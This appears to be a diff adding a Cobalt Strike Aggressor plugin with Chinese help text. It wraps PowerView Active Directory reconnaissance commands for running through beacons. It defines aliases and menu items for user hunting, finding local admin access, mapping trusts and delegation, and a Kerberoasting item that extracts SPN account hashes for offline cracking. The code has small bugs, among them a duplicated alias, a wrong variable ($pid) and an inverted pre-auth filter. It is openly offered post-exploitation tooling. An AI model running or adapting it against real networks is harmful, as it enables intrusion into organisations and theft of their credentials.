@@ -1,0 +1,316 @@
+alias Get-NetDomain{
+	bpowerpick($1, "Get-NetDomain");
+}
+
+alias Get-NetUser{
+	bpowerpick($1, "Get-NetUser");
+}
+
+alias Get-NetComputer{
+	bpowerpick($1, "Get-NetComputer");
+}
+
+alias Get-NetDomainController{
+	bpowerpick($1, "Get-NetDomainController");
+}
+
+alias Get-NetComputer{
+	bpowerpick($1, "Get-NetComputer");
+}
+alias Get-NetPrinter{
+	bpowerpick($1, "Get-NetPrinter");
+}
+alias Get-NetOU{
+	bpowerpick($1, "Get-NetOU");
+}
+alias Get-NetGroup{
+	bpowerpick($1, "Get-NetGroup");
+}
+alias Get-NetGroupMember{
+	bpowerpick($1, "Get-NetGroupMember");
+}
+alias Get-NetFileServer{
+	bpowerpick($1, "Get-NetFileServer");
+}
+alias Get-NetShare{
+	bpowerpick($1, "Get-NetShare");
+}
+alias Get-DFSshare{
+	bpowerpick($1, "Get-DFSshare");
+}
+alias Get-NetSubnet{
+	bpowerpick($1, "Get-NetSubnet");
+}
+alias Get-NetSite{
+	bpowerpick($1, "Get-NetSite");
+}
+alias Get-NetDomainTrust{
+	bpowerpick($1, "Get-NetDomainTrust");
+}
+alias Get-NetForestTrust{
+	bpowerpick($1, "Get-NetForestTrust");
+}
+alias Find-ForeignUser{
+	bpowerpick($1, "Find-ForeignUser");
+}
+alias Find-ForeignGroup{
+	bpowerpick($1, "Find-ForeignGroup");
+}
+alias Invoke-MapDomainTrust{
+	bpowerpick($1, "Invoke-MapDomainTrust");
+}
+alias Get-NetLoggedon{
+	bpowerpick($1, "Get-NetLoggedon");
+}
+alias Get-NetLocalGroup{
+	bpowerpick($1, "Get-NetLocalGroup");
+}
+alias Get-NetSession{
+	bpowerpick($1, "Get-NetSession");
+}
+alias Get-NetRDPSession{
+	bpowerpick($1, "Get-NetRDPSession");
+}
+alias Get-NetProcess{
+	bpowerpick($1, "Get-NetProcess");
+}
+alias Get-UserEvent{
+	bpowerpick($1, "Get-UserEvent");
+}
+alias Get-ADObject{
+	bpowerpick($1, "Get-ADObject");
+}
+alias Get-NetGPO{
+	bpowerpick($1, "Get-NetGPO");
+}
+alias Get-NetGPOGroup{
+	bpowerpick($1, "Get-NetGPOGroup");
+}
+alias Find-GPOLocation{
+	bpowerpick($1, "Find-GPOLocation");
+}
+alias Find-GPOComputerAdmin{
+	bpowerpick($1, "Find-GPOComputerAdmin");
+}
+alias Get-DomainPolicy{
+	bpowerpick($1, "Get-DomainPolicy");
+}
+alias Get-DomainSID{
+	bpowerpick($1, "Get-DomainSID");
+}
+alias Invoke-UserHunter{
+	bpowerpick($1, "Invoke-UserHunter");
+}
+alias Invoke-ProcessHunter{
+	bpowerpick($1, "Invoke-ProcessHunter");
+}
+alias Invoke-UserEventHunter{
+	bpowerpick($1, "Invoke-UserEventHunter");
+}
+alias Invoke-ShareFinder{
+	bpowerpick($1, "Invoke-ShareFinder");
+}
+alias Invoke-FileFinder{
+	bpowerpick($1, "Invoke-FileFinder");
+}
+alias Find-LocalAdminAccess{
+	bpowerpick($1, "Find-LocalAdminAccess");
+}
+alias Find-ManagedSecurityGroups{
+	bpowerpick($1, "Find-ManagedSecurityGroups");
+}
+alias Get-ExploitableSystem{
+	bpowerpick($1, "Get-ExploitableSystem");
+}
+alias Invoke-EnumerateLocalAdmin{
+	bpowerpick($1, "Invoke-EnumerateLocalAdmin");
+}
+sub powerview_help{
+	blog($1, "本插件集成powerview常用的命令(需要自定义命令的还请powerpick)");
+	blog($1, "powerview-import 导入powerview脚本 (导入分支的时候记得先清空原先导入的)");
+	blog($1, "Get-NetDomain 获取当前用户所在域的名称");
+	blog($1, "Get-NetUser 获取所有用户的详细信息");
+	blog($1, "Get-NetDomainController 获取所有域控制器的信息");
+    blog($1, "Get-NetComputer 获取域内所有机器的详细信息");
+    blog($1, "Get-NetPrinter 获取域中所有当前计算机对象的数组");
+    blog($1, "Get-NetOU 获取域内的OU信息");
+    blog($1, "Get-NetGroup 获取所有域内组和组成员的信息");
+    blog($1, "Get-NetGroupMember 获取指定域组中所有当前用户的列表");
+    blog($1, "Get-NetFileServer 根据SPN获取当前域使用的文件服务器信息");
+    blog($1, "Get-NetShare 获取当前域内所有的网络共享信息");
+    blog($1, "Get-DFSshare 获取域上所有分发文件系统共享的列表");
+    blog($1, "Get-NetSubnet 获取域的其他网段");
+    blog($1, "Get-NetSite 获取域内的当前站点");
+    blog($1, "Get-NetDomainTrust 获取当前用户域的所有信任");
+    blog($1, "Get-NetForestTrust 获取与当前用户的域关联的林的所有信任");
+    blog($1, "Find-ForeignUser 枚举在其主域之外的组中的用户");
+    blog($1, "Find-ForeignGroup 枚举域组的所有成员并查找查询域之外的用户");
+    blog($1, "Invoke-MapDomainTrust 尝试构建所有域信任的关系映射");
+    blog($1, "Get-NetLoggedon 获取主动登录到指定服务器的用户");
+    blog($1, "Get-NetLocalGroup 获取一个或多个远程主机上本地组的成员");
+    blog($1, "Get-NetSession 获取指定服务器的会话");
+    blog($1, "Get-NetRDPSession 获取指定服务器的远程连接");
+    blog($1, "Get-NetProcess 获取远程主机的进程");
+    blog($1, "Get-UserEvent 获取指定用户的日志");
+    blog($1, "Get-ADObject 获取活动目录的对象");
+    blog($1, "Get-NetGPO 获取域内所有的组策略对象");
+    blog($1, "Get-NetGPOGroup 获取域中设置”受限组”的所有GPO");
+    blog($1, "Find-GPOLocation 获取用户/组，并通过GPO枚举和关联使其具有有效权限的计算机");
+    blog($1, "Find-GPOComputerAdmin 获取计算机并通过GPO枚举确定谁对其具有管理权限");
+    blog($1, "Get-DomainPolicy 获取域默认策略或域控制器策略");
+    blog($1, "Get-DomainSID 返回指定域的SID");
+    blog($1, "Invoke-UserHunter 获取域用户登录的计算机信息及该用户是否有本地管理员权限");
+    blog($1, "Invoke-ProcessHunter 通过查询域内所有的机器进程找到特定用户");
+    blog($1, "Invoke-UserEventHunter 根据用户日志查询某域用户登陆过哪些域机器");
+    blog($1, "Invoke-ShareFinder 在本地域中的主机上查找（非标准）共享");
+    blog($1, "Invoke-FileFinder 在本地域中的主机上查找潜在的敏感文件");
+    blog($1, "Find-LocalAdminAccess 在域上查找当前用户具有本地管理员访问权限的计算机");
+    blog($1, "Find-ManagedSecurityGroups 搜索受管理的活动目录安全组并标识对其具有写访问权限的用户，即这些组拥有添加或删除成员的能力");
+    blog($1, "Get-ExploitableSystem 发现系统可能易受常见攻击");
+    blog($1, "Invoke-EnumerateLocalAdmin 枚举域中所有计算机上本地管理员组的成员");
+}
+
+sub moduleimport{
+	foreach $bid ($1){
+		blog($bid, "导入脚本: $modulename");
+		bpowershell_import($bid, script_resource($modulename));
+	}
+}
+
+sub getuser{
+	bpowershell($bid, "Get-ADUser -Identity \"$3['username']\"");
+}
+
+sub groupquery{
+	bpowershell($bid, "Get-ADGroupMember \'$3['groupname']\' | Select-Object name,objectClass,distinguishedName,SID | fl");
+}
+
+sub spnuserquery{
+	bpowershell($bid, "Invoke-Kerberoast -Identity \'$3['spnusername']\' | %{\$_.hash}");
+}
+
+
+menu "PowerView"{
+	item "导入Powerview"{
+		$modulename = "bin/Powerview.ps1";
+		moduleimport($1, $modulename);
+		foreach $bid ($1){
+			blog2($bid, "powerview导入测试");
+			bpowershell($bid, "Get-DomainController");
+		}
+	}
+	item "查看指定的用户信息"{
+		$modulename = "Powerview.ps1";
+		moduleimport($1, $modulename);
+		foreach $bid ($1){
+			$dialog = dialog("查看指定用户", %(username => ""), &getuser);
+			dialog_description($dialog, "powerview查看指定用户的信息");
+			drow_text($dialog, "username", "用户: ");
+			dbutton_action($dialog, "QUERY");
+			dialog_show($dialog);
+		}
+	}
+
+	item "所有用户最后一个错误的密码尝试"{
+		$modulename = "Powerview.ps1";
+		moduleimport($1, $modulename);
+		foreach $bid ($1){
+			bpowershell($bid, "
+get-aduser -filter * -prop lastbadpasswordattempt,badpwdcount | select name,lastbadpasswordattempt,badpwdcount | format-table -auto");
+		}
+	}
+
+
+	item "查询某个组的用户"{
+		$modulename = "Powerview.ps1";
+		moduleimport($1, $modulename);
+		foreach $bid ($1){
+			$dialog = dialog("查看指定组的所有用户", %(groupname => ""), &groupquery);
+			dialog_description($dialog, "powerview查看指定组的所有用户");
+			drow_text($dialog, "groupname", "组名: ");
+			dbutton_action($dialog, "QUERY");
+			dialog_show($dialog);
+		}
+
+	}
+
+	item "域控机器查询"{
+		$modulename = "Powerview.ps1";
+		moduleimport($1, $modulename);
+		foreach $bid ($1){
+			bpowershell($bid, "Get-ADDomainController -filter * | Select-Object HostName,IPv4Address,OperatingSystem | fl");
+		}
+	}
+
+	item "获取域级别"{
+		$modulename = "Powerview.ps1";
+		moduleimport($1, $modulename);
+		foreach $bid ($1){
+			bpowershell($bid, "Get-ADDomain | Select-Object DNSRoot,PDCEmulator,DomainMode");
+		}
+	}
+
+	item "寻找域内所有计算机和计算机对应的DNS"{
+		$modulename = "Powerview.ps1";
+		moduleimport($1, $modulename);
+		foreach $bid ($1){
+			bpowershell($bid, "Get-ADComputer -Filter * -Property Name,IPv4Address | Select-Object DNSHostName,IPv4Address,SID | fl");
+		}
+	}
+
+	item "寻找域内所有用户"{
+		$modulename = "Powerview.ps1";
+		moduleimport($1, $modulename);
+		foreach $bid ($1){
+			bpowershell($bid, "Get-ADUser -Filter * | Select-Object Name,ObjectClass,SID | fl");
+		}
+	}
+
+	item "寻找kerberos服务用户"{
+		$modulename = "Powerview.ps1";
+		moduleimport($1, $modulename);
+		foreach $bid ($1){
+			bpowershell($bid, "Get-ADUser -filter {ServicePrincipalName -like \"*\"} -Property * | Select-Object Name,SID,ServicePrincipalNames | fl");
+		}
+	}
+
+	item "无委派计算机查询"{
+		$modulename = "Powerview.ps1";
+		moduleimport($1, $modulename);
+		foreach $bid ($1){
+			bpowershell($bid, "Get-ADComputer -Filter {TrustedForDelegation -eq \$True} -Properties * | select-object DNSHostName,IPv4Address,KerberosEncryptionType,whenCreated | fl");
+		}
+	}
+
+	item "约束委派用户查询"{
+		$modulename = "Powerview.ps1";
+		moduleimport($1, $modulename);
+		foreach $bid ($1){
+			bpowershell($bid, "Get-ADUser -Filter {TrustedToAuthForDelegation -eq \$True} -Properties * | select-object DistinguishedName,servicePrincipalName,msDS-AllowedToDelegateTo");
+		}
+	}
+
+	item "域用户不要求kerberos验证身份查询"{
+		$modulename = "Powerview.ps1";
+		moduleimport($1, $modulename);
+		foreach $bid ($1){
+			bpowershell($pid, "Get-ADUser -Filter {DoesNotRequirePreAuth -eq \$False} | Select-Object Name,SID | fl");
+		}
+	}
+
+	item "获取指定SPN用户的hash"{
+		$modulename = "Powerview.ps1";
+		moduleimport($1, $modulename);
+		foreach $bid ($1){
+			$dialog = dialog("获取指定SPN用户的hash", %(spnusername => ""), &spnuserquery);
+			dialog_description($dialog, "powerview获取指定SPN用户的hash");
+			drow_text($dialog, "spnusername", "用户: ");
+			dbutton_action($dialog, "QUERY");
+			dialog_show($dialog);
+		}
+	}
+	item "命令列表"{
+		powerview_help($1);
+	}
+	
+}
